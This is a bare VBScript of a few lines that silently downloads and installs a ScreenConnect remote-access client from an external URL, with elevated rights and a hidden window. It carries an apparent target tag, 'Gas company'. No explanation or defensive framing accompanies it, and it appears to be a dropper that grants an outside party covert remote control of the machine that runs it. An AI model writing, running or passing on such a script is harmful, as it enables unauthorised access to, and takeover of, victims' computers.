Set oShell = CreateObject("Shell.Application")

oShell.ShellExecute "msiexec.exe", "/i https://hiremore.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Gas%20company&c=&c=&c=&c=&c=&c=&c= /quiet /norestart", "", "runas", 0

